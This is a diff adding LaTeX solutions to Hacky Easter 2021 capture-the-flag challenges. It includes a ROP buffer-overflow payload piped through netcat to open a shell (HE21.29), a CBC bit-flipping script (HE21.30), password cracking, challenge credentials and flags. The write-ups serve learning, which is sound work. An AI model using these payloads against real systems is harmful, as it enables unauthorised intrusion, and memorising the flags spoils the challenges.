+    err /= float(im1_arr.shape[0])
+    return 3.0*err
+
+def match(im1_arr, im2_arrs):
+    rms = np.empty(4, dtype=np.float)
+    for i in range(4):
+        rms[i] = mse(im1_arr, im2_arrs[i])
+    avg = np.sum(rms) / 4.0
+    rms2 = np.true_divide(rms, avg)
+    return (np.max(rms2) - np.min(rms2))
+
+def match_with(im, im2, thresh):
+    (sX,sY) = im.size
+    arrlen = sX*sY*3
+    (sX2,sY2) = im2.size
+
+    if sX == sX2 and sX == sY2 and sX == sY:
+        # build an array with all rotated images as arrays
+        im_arrs = []
+        for i in range(4):
+            im_arrs.append(np.array(im, dtype=np.float).reshape((arrlen)))
+            if i < 3:
+                im = im.rotate(90)
+        im_arr2 = np.array(im2, dtype=np.float).reshape((arrlen))
+        m = match(im_arr2,im_arrs)
+        if m > thresh:
+            return True
+    else:
+        if sX == sX2 and sY == sY2:
+            return True
+        elif sX == sY2 and sY == sX2:
+            return True
+        else:
+            return False
+    return False
+\end{minted}
+
+The code is straight-forward, the only issue was with images that are not
+square: these cannot be dealt with so easily; for now we just assume that they
+are the same, if the dimensions are compatible.
+
+Solving the challenge is then relatively easy:
+\begin{minted}{python}
+base_url = "http://46.101.107.117:2107/"
+def getPics(s):
+    pics = {}
+    for i in range(1,99):
+        u = base_url+'pic/%d'%i
+        r = s.get(u)
+        with io.BytesIO(r.content) as imgF:
+            img = Image.open(imgF)
+            img.load()
+            pics[i] = img
+    return(pics)
+
+
+def runMatch(session, pics, found, thresh):
+    solve_url = base_url+'solve'
+    post_data = {'first': '1', 'second': '2'}
+    for i in range(1,99):
+        if not found[i]:
+            for j in range(i+1, 99):
+                if not found[j]:
+                    try:
+                        if match_with(pics[i], pics[j], thresh):
+                            post_data['first'] = i
+                            post_data['second'] = j
+                            r = session.post(solve_url, post_data)
+                            if r.text[:2] != 'ok' and r.text != 'nextRound':
+                                raise ValueError
+                            # print('pics %d and %d match!' %(i,j))
+                            found[i] = True
+                            found[j] = True
+                            break
+                    except ValueError:
+                        print(i,j)
+                        print(pics[i].size, pics[j].size)
+                        print(r.text)
+                        # pics[i].show()
+                        # pics[j].show()
+                        pass
+
+    nNotFound = 0
+    for v in found:
+        if not v:
+            nNotFound += 1
+    return r.text, session, found, nNotFound
+
+def solveRound(session):
+    r = session.get(base_url)
+    pics = getPics(session)
+    found = [False for i in range(99)]
+    found[0] = True
+    nNotFound = 98
+    thresh = 0.9
+
+    while nNotFound > 0:
+        result, session, found, nNotFound = \
+            runMatch(session, pics, found, thresh)
+        print(result, nNotFound, thresh)
+        thresh -= 0.1
+    return result
+
+
+def solve():
+    count = 0
+    ok = 'nextRound'
+    res = ok
+    session = requests.session()
+    while res == ok:
+        count += 1
+        print('round: ', count)
+        res = solveRound(session)
+        print(res)
+
+
+solve()
+\end{minted} 
+
+\noindent In the end we get the result
+
+\noindent \verb+ok, here is your flag: he2021{0k-1-5u44end3r-y0u-w1n!}+
+
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge22.jpg}
+\end{marginfigure}
+
+\hypertarget{he21.22}{%
+  \section{HE21.22 46 Apes}
+  \label{he21.22}}
+
+\noindent 46 apes encoded a message for you:
+
+\noindent\verb+2Qu93ZhJHdsMGIlhmcgUXagMWe19icmBGbnFiOoBTZwIjM7FGd0gHdfNTbuB2a5V2X1JzcuF3MzNQf==+
+
+\hypertarget{he21.22-solution}{%
+\subsection{HE21.22 Solution}\label{he21.22-solution}}
+
+\noindent First thought: it looks like base64 encoded, but this yields a binary.  But 
+``46 Apes'' could mean to reverse the string, except for the padding.  So head over 
+to Cyber Chef and try:
+
+\noindent\verb+}.s3qns2u_eyk`nm3_tx4ta{220e0h:!gl`fr/uyc iu rhe c,trag.nC+. 
+
+\noindent This looks much better, as it is all printable characters and it is kind of reversed. 
+ The last word is probably ``Congrats'', so see what is up:
+
+\begin{verbatim}
+>>> base64.b64encode(b'Congrats')
+b'Q29uZ3JhdHM='
+\end{verbatim}
+
+It looks like the original message was just reversed in packets of two:
+original is \verb+2Qu93Z+, correct would be \verb+Q29uZ3+.  So do the reordering by hand to get
+
+\noindent\verb+2Qu93ZhJHdsMGIlhmcgUXagMWe19icmBGbnFiOoBTZwIjM7FGd0gHdfNTbuB2a5V2X1JzcuF3MzNQf==+
+
+\noindent\verb+Q29uZ3JhdHMsIGhlcmUgaXMgeW91ciBmbGFnOiBoZTIwMjF7dGg0dHNfbTBua2V5X2J1czFuM3NzfQ==+
+
+\noindent Which gives the flag 
+
+\noindent\verb+Congrats, here is your flag: he2021{th4ts_m0nkey_bus1n3ss}+
+
+\hypertarget{he21.23}{%
+  \section{HE21.23 Eggcryptor}
+  \label{he21.23}}
+\noindent Eggcryptor is hiding something from you.
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge23.jpg}
+\end{marginfigure}
+
+\begin{itemize}
+\item Crack it and get the Easter Egg!
+\item\verb+eggcryptor.apk+ is provided.
+\end{itemize}
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item You don't need to run the app. Just decompile and analyze it.
+\end{itemize}
+
+
+\hypertarget{he21.23-solution}{%
+\subsection{HE21.23 Solution}\label{he21.23-solution}}
+
+\noindent The apk can be analysed using a decompiler, we used \verb+jadx-ui+.
+What the program does:
+
+\begin{itemize} 
+    \item There is in entry form to get a PIN, this PIN has to match a regular
+        expression of \verb+[a-z][0-9]{4}+
+    \item There is a raw, base64 encoded secret stored in variable \verb+raw+.
+    \item The PIN and the raw data are passed to a crypto function, that does
+        an AES decryption.
+    \item If the PIN is correct, we get a picture of an egg.
+\end{itemize}
+So we can write a brute forcer for the 26*10'000 possible PINs, using the recovered java source code.
+
+\begin{minted}[fontsize=\small]{java}
+
+package com.company;
+
+import java.io.FileOutputStream;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.regex.Pattern;
+import java.util.Base64;
+
+public class Main {
+    final static String alph = "abcdefghijklmnopqrstuvwxyz";
+    final static String num  = "0123456789";
+    public static void main(String[] args) throws IOException {
+        final Pattern p = Pattern.compile("[a-z][0-9]{4}");
+        final String filePath = "raw.txt";
+        String r;
+        r = new String(Files.readAllBytes( Paths.get(filePath) ));
+        final byte[] raw = Base64.getDecoder().decode(r);
+        FileWriter myWriter = new FileWriter("output.txt");
+
+        for (int ia = 0 ; ia < 26 ; ia++ ) {
+            for (int i1 = 0 ; i1 < 10 ; i1++ ) {
+                String t1 = "" + alph.charAt(ia) + num.charAt(i1);
+                for (int i2 = 0 ; i2 < 10 ; i2++ ) {
+                    String t2 = t1 + num.charAt(i2);
+                    System.out.println(t2);
+                    for (int i3 = 0; i3 < 10; i3++) {
+                        String t3 = t2 + num.charAt(i3);
+                        for (int i4 = 0; i4 < 10; i4++) {
+                            String pin = t3 + num.charAt(i4);
+                            if (p.matcher(pin).matches()) {
+                                //byte[] d = new byte[0];
+                                try {
+                                    byte[] d = Crypto.decrypt(pin, r);
+                                    myWriter.write(pin + ": ");
+                                    myWriter.write(d[1]);
+                                    myWriter.write(d[2]);
+                                    myWriter.write(d[3]);
+                                    myWriter.write("\n"); //, d[2], d[3]);
+                                    if( d[1] == 'P' && d[2] == 'N' && d[3] == 'G') {
+                                        System.out.println("Found solution for PIN " + pin);
+                                        try (FileOutputStream stream =
+                                            new FileOutputStream(pin + ".png")) {
+                                            stream.write(d);
+                                        }
+                                    }
+                                } catch (Exception e) {
+                                    //pass; //e.printStackTrace();
+                                }
+                            } else {
+                                System.out.println("String " + pin + " does not match pattern!");
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+\end{minted}
+
+% <string name="egg">NB2HI4DTHIXS653XO4XHS33VOR2WEZJOMNXW2L3XMF2GG2B7OY6XKYRYGJMGEMKDHBXXG===</string>
+% <string name="pattern">[a-z][0-9]{4}</string>
+\noindent For the PIN \verb+g0717+ we get the egg and the 
+flag is \verb+he2021{th3r3s_4_h4ck_4_th4t}+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch23/solution23.png}
+\end{marginfigure}
+
+\subsection{Sidenotes}
+
+Within the apk is also a resource named "egg" that is
+base32 encoded and when decoded gives
+\url{https://www.youtube.com/watch?v=ub82Xb1C8os}.  But by now we know better
+than to click on the link...
+
+Within the Crypto class, there is a class variable named "EGG" with contents
+that are repeatedly base64 encoded from the original string "nope".  So another
+loose end tied up.
+
+\hypertarget{he21.24}{%
+  \section{HE21.24 Taco Cat}
+  \label{he21.24}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge24.jpg}
+\end{marginfigure}
+
+\noindent Was it a cat I saw?
+
+\noindent file \verb+tacocat.zip+ provided.
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item lowercase
+\end{itemize}
+
+\hypertarget{he21.24-solution}{%
+\subsection{HE21.24 Solution}\label{he21.24-solution}}
+
+\noindent The zip-file is password protected.  Everything in the description
+and in the hits points towards an anagram password in lower case.  Cracking
+zips can be done using John the Ripper, but we need a good list of passwords.
+So generate a short program to dump the anagrams up to 9 letters into a file
+start cracking.  First use \verb+zip2john+ to generate the proper input file,
+and then run john:
+
+\begin{verbatim} 
+.\john.exe --wordlist=..\..\level4.txt ..\..\tacocat.hash
+\end{verbatim}
+
+\noindent This yields the password \verb+mousesuom+ to open the zip and extract the file
+\verb+eggge.png+ with the flag \verb+he2021{!y0.ban4na.b0y!}+.
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch24/eggge.png}
+\end{marginfigure}
+
+\hypertarget{he21.25}{%
+  \section{HE21.25 Lots of JWTs}
+  \label{he21.25}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge25.jpg}
+\end{marginfigure}
+
+\noindent So many JWTs! What do they hide?
+
+\noindent file \verb+jwts.txt+ provided.
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item You better write a script.
+\end{itemize}
+
+\hypertarget{he21.25-solution}{%
+\subsection{HE21.25 Solution}\label{he21.25-solution}}
+
+\noindent The file contains a jwt that, when expanded, consists again of
+several jwts.  Use python to expand them all until we reach the bottom and then
+printing the content gives us a list of fragments:
+
+\begin{verbatim}
+f_js0
+n_t0k
+nty_0
+he202
+1{pl3
+k3nZ}
+\end{verbatim}
+
+With a bit of imagination these fragments can be combined into
+\verb+he2021{pl3nty_0f_js0n_t0kk3nZ}+
+
+\hypertarget{he21.26}{%
+  \section{HE21.26 Lost}
+  \label{he21.26}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge26.jpg}
+\end{marginfigure}
+
+\noindent One of the flags accidentally fell into the pot with the rejected ones!
+
+\begin{itemize}
+\item Can you recover the lost flag?
+\item file \verb+lost.pdf+ provided.
+\end{itemize}
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item 23
+\end{itemize}
+
+\hypertarget{he21.26-solution}{%
+\subsection{HE21.26 Solution}\label{he21.26-solution}}
+
+\noindent Look at the pdf using \verb+binwalk+ to find the uncompressed content
+of the PDF.  Within there are 500 lines with flags, so we have to try them
+manually or find a way to submit them automatically.  After struggling to find
+a way using python and the request library, we found it easier to rip out the
+function submit flag and abuse it.  This runs quickly and finds the flag
+\verb+{flag: "he2021{3t5Kc-PiP6Z-9xa2f-RNJrY-auDng}"}+.
+
+\begin{minted}[fontsize=\small]{js}
+var arr = [
+"he2021{4MG5D-A2BSg-0ohGW-aCRKT-XNzkS}",
+...
+"he2021{hZjl3-pE1wv-IJIyV-Gl8nt-jqavv}"
+];
+
+function submit(flagText) {
+    const requestOptions = {
+      method: 'POST',
+      mode: 'cors',
+      cache: 'no-cache',
+      credentials: 'include',
+      headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
+      body: JSON.stringify({ flag: flagText })
+    };
+    fetch('https://21.hackyeaster.com/rest/user/challenge/26/checkflag', requestOptions)
+      .then(response => response.json())
+      .then(data => {
+        // check result
+        if (data && data.solveStatus) {
+          if (data.solveStatus === 'CORRECT') {
+              console.log(flagText);
+              return true;
+          }
+          return false;
+        }
+      })
+      .catch((err) => {
+        window.location.href = config.AUTH_URL;
+        return false;
+      });
+}
+
+    for(p in arr) {
+        if (submit(arr[p])) {
+            console.log(arr[p]);
+            break;
+        }
+    }
+\end{minted} 
+
+\hypertarget{he21.27}{%
+  \section{HE21.27 Ghost in a Shell 2}
+  \label{he21.27}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge27.jpg}
+\end{marginfigure}
+
+{\footnotesize \begin{verbatim} 
+  _, _,_  _,  _, ___   _ _, _    _,    _, _,_ __, _,  _,    ,  ,  
+ / _ |_| / \ (_   |    | |\ |   /_\   (_  |_| |_  |   |     |  |  
+ \ / | | \ / , )  |    | | \|   | |   , ) | | |   | , | ,   |  |  
+  ~  ~ ~  ~   ~   ~    ~ ~  ~   ~ ~    ~  ~ ~ ~~~ ~~~ ~~~   ~  ~  
+______________________________________________________________________  
+ ,--.     ,--.    
+| oo |   | oo |   
+| ~~ |   | ~~ |   o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  
+|/\/\|   |/\/\|     
+______________________________________________________________________  
+\end{verbatim} 
+}
+
+\noindent Connect to the server, snoop around, and find the flag!
+
+\verb+ssh 46.101.107.117 -p 2108 -l clyde+
+password is: \verb+555-ClYdE+
+Note: The service is restarted every hour at x:00.fell into the pot with the rejected ones!
+
+\hypertarget{he21.27-solution}{%
+\subsection{HE21.27 Solution}\label{he21.27-solution}}
+
+\noindent When we log in, we see only one file, \verb+flag?.txt+, the ASCII version of Rick-rolling.  In \verb$.lost+found$ is also a file, but it is write protected.
+
+\begin{verbatim}
+476859378aa9:~/.lost+found$ ls -l
+total 4
+-r--r-----    1 root     pacman          32 Apr  5 19:00 flag.txt
+476859378aa9:~$ cd /home/pacman
+476859378aa9:/home/pacman$ ls -la
+total 28
+drwxr-xr-x    1 root     root          4096 Apr  5 19:00 .
+-rwxr-xr-x    1 root     root             9 Apr  5 19:00 ."\?$*'N'*$?\"
+drwxr-xr-x    1 root     root          4096 Apr  3 05:23 ..
+-rwxr-xr-x    1 root     root           312 Mar  2 12:05 .bash_history
+-rwxr-xr-x    1 root     root           277 Mar  2 12:05 notes.txt
+476859378aa9:/home/pacman$ cat .\"*
+msPACM4n
+476859378aa9:/home/pacman$ cat .bash_history
+history -c
+whoami
+ls -lrt
+cd /home/pacman
+du -sh
+vi notes.txt
+clear
+cd /var/log
+passwd
+ls
+clear
+cd ~
+vi notes.txt
+man cat
+man unzip
+man sg
+find . -type f
+find . -type f | grep mp4
+find . -type f | grep mp4 | sort
+clear
+cd ~
+ps -ef | grep java
+kill 1236
+killall java
+reboot
+ls -lrt
+rm -rf /home/pacman/secret
+exit
+476859378aa9:/home/pacman$ cat notes.txt
+\end{verbatim} 
+\noindent
+\textltshade\textblock\textupblock\textupblock
+\textltshade\textblock\textupblock\textblock
+\textltshade\textblock
+\textltshade\textblock\textupblock\textupblock
+\textltshade\textltshade\textblock\textupblock\textupblock
+\textltshade\textblock\textupblock\textblock
+\textltshade\textblock
+\textltshade\textblock\\
+\noindent
+\textltshade\textblock\textupblock\textupblock
+\textltshade\textblock\textupblock\textupblock
+\textltshade\textblock
+\textltshade\textblock\textltshade\textltshade
+\textltshade\textltshade\textblock\textupblock\textupblock
+\textltshade\textblock\textupblock\textblock
+\textltshade\textblock
+\textltshade\textblock\\
+\noindent
+\textltshade\textupblock\textupblock\textupblock
+\textltshade\textupblock\textltshade\textltshade
+\textltshade\textupblock
+\textltshade\textupblock\textupblock\textupblock
+\textltshade\textltshade\textupblock\textltshade\textltshade
+\textltshade\textupblock\textltshade\textupblock
+\textltshade\textupblock
+\textltshade\textupblock\textupblock\textupblock\\
+\begin{verbatim}
+476859378aa9:/home/pacman$ 
+\end{verbatim} 
+
+
+The first file \verb+"\?$*'N'*$?\"+ contains something that looks like a
+password: \verb+msPACM4n+
+
+Combining the history file, we see that the command \verb+sg+ was used and it
+would execute a command within another group.  The flag is owned by
+\verb+pacman+ and so we try if works with the given password:
+
+\begin{verbatim} 
+f9bc7196c810:~$ sg pacman "cat .lost\+found/flag.txt "
+Password:
+he2021{wh4ts_y0ur_grewp_4g4in?}
+f9bc7196c810:~$
+\end{verbatim} 
+
+\hypertarget{he21.28}{%
+  \section{HE21.28 Haxxor what 2?}
+  \label{he21.28}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge28.jpg}
+\end{marginfigure}
+
+\noindent I was able to break the first file, but I'm stuck at this one.
+
+\noindent Help!
+
+\noindent file \verb+haxxorwhat2+ provided.
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item This time, the file is not an image.
+\end{itemize}
+
+\hypertarget{he21.28-solution}{%
+\subsection{HE21.28 Solution}\label{he21.28-solution}}
+
+\noindent From the name of the challenge we assumed that it is again an xor
+encryption.  And from the hint, since it is not an image file, it probably is
+something like a zip-file.  So try to xor the first four bytes with the magic
+number for zip files \verb+0x50 4B 03 04+ using Cyber Chef.  The result is
+encouraging with \verb+xorl+.  So zip is a good guess.  Let's see if we find
+the end of directory record at the end of the file.  And yes, we see the
+tell-tale \verb+PK+ there as well.  By extending the xor-key, we can figure out
+that the xor-key has to be a multiple of 8 characters long -- otherwise the end
+of record loses the \verb+PK+.
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch28/egg.png}
+\end{marginfigure}
+
+Using the specification and looking at the end of file directory entries, we
+can find the values for the last three bytes (they must all be zero).  So we
+end up with \verb+xorl.tan+, only one letter missing.  Opening the decoded
+zip-file, we see a funny file name for a file that must be called
+\verb+egg.png+, so finally we have the complete key \verb+xorlatan+. Extracting
+the zip gives us the egg with the flag \verb+he2021{ul1m4te_x0r_m4st3r}+.
+
+
+\hypertarget{he21.29}{%
+\section{HE21.29 Sailor's Knot}
+  \label{he21.29}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge29.jpg}
+\end{marginfigure}
+
+\noindent There is a huge variety of sailor's knots, but the common thing is they all use rops
+or other types of cords.
+\begin{itemize}
+\item\verb+nc 46.101.107.117 2112+
+\item Get a shell and read the flag.
+\end{itemize}
+\noindent Note: The service is restarted every hour at x:00
+
+\noindent file \verb+sailorsknot+ provided.
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item Ubuntu 18.04 64 Bit
+\end{itemize}
+
+\hypertarget{he21.29-solution}{%
+\subsection{HE21.29 Solution}\label{he21.29-solution}}
+
+\noindent Disassembly of the main function looks the same as in
+Challenge~\ref{he21.16}.  So we can again overflow a string to jump anywhere in
+the binary.  The function \verb+profit()+ is missing though.  On the other
+hand, there is a strange function \verb+remove_me_before_deploy()+ that is
+followed by some junk.  Disassembling the junk shows that there is one part
+that calls \verb+system("/bin/ls")+, so this should give us at least something
+to work with.
+
+\begin{figure}
+    \includegraphics[width=150mm]{ch29/remove_me_before_deploy.png}
+\end{figure}
+
+{\footnotesize\begin{verbatim}
+$ printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDEEEEEEEE\xc5\x07\x40\x00\x00\x00\x00\x00\nls -l\n" | nc
+ 46.101.107.117 2112
+Welcome! Please give me your name!
+> Hi AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDEEEEEEEE@, nice to meet you!
+challenge2
+flag
+ynetd
+\end{verbatim} 
+}
+
+So we get the listing and see that there is a file names \verb+flag+.  Again,
+we have to find a way to print the flag.
+
+Looking again at the junk after \verb+remove_me_before_deploy()+, we seen that
+there is a \verb+POP RDI+ that we can use to load \verb+RDI+ from the stack and
+if we jump directly to \verb+system+ further below, we can execute this
+function with a string that we control.  So we have to build up a stack that
+matches this requirement.
+
+Further search in the binary finds a string that can be of use: 
+\verb+Please ensure you remove _all_ references to the /bin/sh+.  This is a handy argument for our exploit.  So what we do:
+
+\begin{itemize}
+\item overflow the buffer with 40 characters
+\item add the address 0x4007bf to jump to the code to load RDI
+\item add the address 0x6010b1 -- the address of \verb+/bin/sh+
+\item add the address 0x4007cc -- the address of the call to \verb+system+
+\end{itemize}
+
+This gives us the shell:
+\begin{verbatim}
+$ printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDEEEEEEEE\xbf\x07\x40\x00\x00  \
+    \x00\x00\x00\xb1\x10\x60\0\0\0\x00\x00\xcc\x07\x40\0\0\0\0\0\nls\n  \
+    cat flag\n">payload
+$ nc 46.101.107.117 2112 < payload
+Welcome! Please give me your name!
+> Hi AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDEEEEEEEE@, nice to meet you!
+challenge2
+flag
+ynetd
+he2021{s41l0r_r0p_f0r_pr0f1t}
+\end{verbatim}
+
+\noindent ... and now we also understand that the rops are not a typo!
+
+
+\hypertarget{he21.30}{%
+\section{HE21.30 Pix FX}
+  \label{he21.30}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge30.jpg}
+\end{marginfigure}
+
+\noindent Hey there! We have our fancy new Pix FX service online!
+
+\noindent Try it out!
+
+\url{http://46.101.107.117:2110}
+
+Note: The service is restarted every hour at x:00
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item egg
+\end{itemize}
+
+\hypertarget{he21.30-solution}{%
+\subsection{HE21.30 Solution}\label{he21.30-solution}}
+
+\noindent The web application lets us select a subject for the picture and add
+an effect to it.  This generates a code that can be used to display the image.
+There are also some predefined codes to look at and one of them shows a
+chocolatized egg.  This is probably what we want to get, just with the least
+distoring effect.  Unfortunately, we cannot select an egg.
+
+Looking at the source code of the page, we see that the code is generated by
+POSTing two parameters, image and effect.  Requesting a code for image=egg and
+effect=3 (sepia) is rejected.
+
+Fetching 10000 codes for the same picture shows that all are different.
+
+So try to see what happens if we flip one bit of the code at a time using
+Postman.  Some changes are outright rejected, but this looks interesting:
+
+\begin{minted}{html}
+<div class="centerbox-outer">
+    <div class="centerbox-inner">
+        <h2>Error!</h2>
+        <span>Unknown field &#39;imafe&#39;</span>
+    </div>
+</div>
+\end{minted}
+
+This looks like the error message from a JSON decoder, expecting a key
+\verb+'image'+ but getting \verb+'imafe'+ instead.  We seem to have flipped one
+character only and so we probably can try to recover the rest.  By varying the
+code at the first 16 bytes and observing the error messages, we learn that the
+code starts with \verb+{'image': 'egg', + (the quotes are assumed to be single
+quotes, but could also be double quotes).
+
+Further tinkering past byte 16 leads to no more insights, but only shows two types of error
+messages: \verb+Parser Error+ or \verb+Decryption Error+.  There is also a hint
+with "chaining" as the subject of an image, that points us towards cipher
+buffer chaining.  With an padding oracle attack it should be possible to decode
+at least the last buffer, maybe more but this is dependent on the decryption
+function used in the CBC.  So try a padding oracle attack on the egg-code and
+it works:  we get \verb+ "effect": 4}+ as the second part of the code.
+
+Now we have the complete code with \verb+{"image": "egg", "effect": 4}+. Effect
+4 is chocolatize and we probably want sepia for the egg to make it readable.
+So we have to construct a valid code for effect 3.  This can be done again
+using a padding attack.  It turns out though, that flipping the effect to
+sepia, destroys the rest of the code because of the decryption function.  So we
+have to try another way: the first block of the code can be manipulated
+directly by changing the first block, so change the file name to \verb+egg+ in
+a sepia picture.  Tony the pony works, since it just fits into the first block.
+So create the block and submit to get the egg:
+
+\begin{minted}{python}
+def setSubject(code, index, now, should, url):
+    codes = []
+    for i in range(2*BLOCKLEN):
+        codes.append(int(code[2*i:2*i+2], 16))
+
+    prefix    = code[:2*index]
+    tail      = code[2*index+2*len(now):]
+    newCrypt = ''
+    for i in range(len(now)):
+        tmp = codes[i+index] ^ ord(now[i]) ^ ord(should[i])
+        newCrypt  += '{:02X}'.format(tmp)
+    session = requests.session()
+    newCode = prefix + newCrypt + tail
+    r = session.get(url + newCode)
+    if decodeStatus(r) == 'ImageFound':
+        print(newCode)
+        return  newCode
+    else:
+        print(decodeStatus(r))
+
+setSubject(pony, 11, 'pony"', 'egg" ', code_url)
+\end{minted}
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch30/egg.png}
+\end{marginfigure}
+ 
+The flag is \verb+he2021{fl1pp1n_da_b1ts_gr34t_succ355}+
+
+\subsection{References:}
+\begin{itemize}
+\item \url{https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CBC}
+\item \url{https://tlseminar.github.io/docs/Crypto101.pdf}
+\end{itemize}
+
+\hypertarget{he21.31}{%
+\section{HE21.31 Hunny Bunny}
+  \label{he21.31}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge31.jpg}
+\end{marginfigure}
+
+\noindent hunnybunny loves music! Can you figure out what else he loves?
+
+\begin{verbatim}
+4ab56415e91e6d5172ee79d9810e30be5da8af18
+c19a3ca5251db76b221048ca0a445fc39ba576a0
+fdb2c9cd51459c2cc38c92af472f3275f8a6b393
+6d586747083fb6b20e099ba962a3f5f457cbaddb
+5587adf42a547b141071cedc7f0347955516ae13
+\end{verbatim}
+
+{\NotoSymbol ⚑} format: \verb+he2021{lowercaseonlynospaces}+
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item The values can be cracked, but they need to be changed somehow first.
+\item One of the values represents the flag prefix.
+\end{itemize}
+
+\hypertarget{he21.31-solution}{%
+\subsection{HE21.31 Solution}\label{he21.31-solution}}
+
+\noindent The lines look like SHA-1 hashes and the hint tells us that one of
+them is the prefix of the flag.  So try out the hash of \verb+he2021{+ and
+compare it to the given hashes.
+
+The first one is very close
+
+\begin{verbatim} 
+input:   4ab56415e91e6d5172ee79d9810e30be5da8af18
+he2021{: 4de56415b91b6a5172bb79a9810b30eb5ad8dc18
+\end{verbatim} 
+
+From comparison, we see that the characters have been exchanged, `a' with `d',
+`b' with `e', and `c' with `f'.  So map the given strings using this rule and
+use \verb+hashcat+ to crack the hashes.  From the flag-format, we can limit the
+search to lower case letters only, except that for the last part we know that
+it has to be terminated with a '\}'.  But first let's try if Crackstation finds
+the hashes -- it does!
+
+\begin{verbatim} 
+4de56415b91b6a5172bb79a9810b30eb5ad8dc18:he2021{
+f19d3fd5251ae76e221048fd0d445cf39ed576d0:hunnybunny
+cae2f9fa51459f2ff38f92dc472c3275c8d6e393:ilovemum
+6a586747083ce6e20b099ed962d3c5c457fedaae:somuch
+5587dac42d547e141071fbaf7c0347955516db13:!}
+\end{verbatim} 
+
+\noindent The flag is \verb+he2021{hunnybunnyilovemumsomuch!}+
+
+\hypertarget{he21.32}{%
+\section{HE21.32 Two Yolks}
+  \label{he21.32}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge32.jpg}
+\end{marginfigure}
+
+\noindent This egg has two yolks.
+
+\begin{itemize}
+\item But the second seems to be hidden somehow.
+\item File \verb+twoyolks.png+ provided.
+\end{itemize}
+
+\hypertarget{he21.32-solution}{%
+\subsection{HE21.32 Solution}\label{he21.32-solution}}
+
+\noindent First step is to analyse the file using binwalk; it reveals that
+there are two image contents stored in the file and we probably only see the
+first.  Have a look at the bitmaps extracted using \verb+binwalk -e+, we see
+that they have both the same number of pixels (1025*1024).  This is consistent
+with the size reported in the header of the file.
+
+The first try: try to use \verb+dd+ to copy the second bitmap to the front and
+show the image.  It shows then part of the QR-code, but in funky colours and
+the bottom is blank.  So analyse the colour indexes used in the bitmaps and we
+see that the second bitmap uses a range larger than the palette!  To see if it
+contains all of the QR-code, print the bitmaps as ASCII, shifting the values up
+by 32 to make them prinable.  It turns out, that the black parts of the QR-code
+has all the same value and so we just turn this into a picture using PIL.
+
+\begin{minted}{python}
+import png
+from PIL import Image
+
+def hist(anArr):
+    pal = {}
+    for i in range(1025*1024):
+        c = anArr[i]
+        if c in pal:
+            pal[c] += 1
+        else:
+            pal[c] = 1
+
+    return pal
+
+
+def saveAscii(fn, arr):
+    with open(fn, 'w') as outF:
+        for rows in range(1024):
+            row = ''
+            for cols in range(1, 1025):
+                row += chr(arr[rows*1025+cols] + 32)
+            outF.write(row + '\n')
+
+with open('pic1', 'rb') as firstF:
+    arr1 = firstF.read()
+    pal1 = hist(arr1)
+
+with open('pic2', 'rb') as firstF:
+    arr2 = firstF.read()
+    pal2 = hist(arr2)
+    saveAscii('pic2.txt', arr2)
+
+with open('twoyolks.png', 'rb') as pngF:
+    r = png.Reader(pngF)
+    (width, height, rows, info) = r.read()
+    print(info)
+
+print('number of colours in palette:', len(info['palette']))
+print('colours used in picture 1:')
+for k in sorted(pal1.keys()):
+    print('key %d: %d' % (k, pal1[k]))
+print('colours used in picture 2:')
+for k in sorted(pal2.keys()):
+    print('key %d: %d' % (k, pal2[k]))
+
+
+qr = Image.new('1', (1024,1024))
+for rows in range(1024):
+    for cols in range(1, 1025):
+        p = arr2[rows*1025+cols]
+        if p == 15:
+            qr.putpixel((cols-1, rows), 0)
+        else:
+            qr.putpixel((cols-1, rows), 1)
+qr.save('qr.png')
+\end{minted} 
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch32/qr.png}
+\end{marginfigure}
+
+\noindent The flag is \verb+he2021{tw0_y0lks_are_gre33eat}+
+
+\hypertarget{he21.33}{%
+\section{HE21.33 Finding Mnemo}
+  \label{he21.33}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge33.jpg}
+\end{marginfigure}
+
+\noindent Dorie has forgotten everything again... Luckily, there is a backup:
+
+\begin{verbatim} 
+ adapt    3555  
+ bind     824e  
+ bless    8fcf  
+ blind    81db  
+ civil    03ec  
+ craft    ed05  
+ garage   9db4  
+ good     d2ba  
+ half     1272   
+ hip      8d53  
+ home     21b7  
+ hotel    1cb0  
+ lonely   e5b8  
+ magnet   16b9  
+ metal    770e  
+ mushroom dd80  
+ napkin   0829  
+ reason   ecd3  
+ rescue   5ef2  
+ ring     e3b0  
+ shift    4ea1  
+ small    f1f6  
+ sunset   b271  
+ tongue   f08d  
+\end{verbatim} 
+
+
+\hypertarget{he21.33-solution}{%
+\subsection{HE21.33 Solution}\label{he21.33-solution}}
+
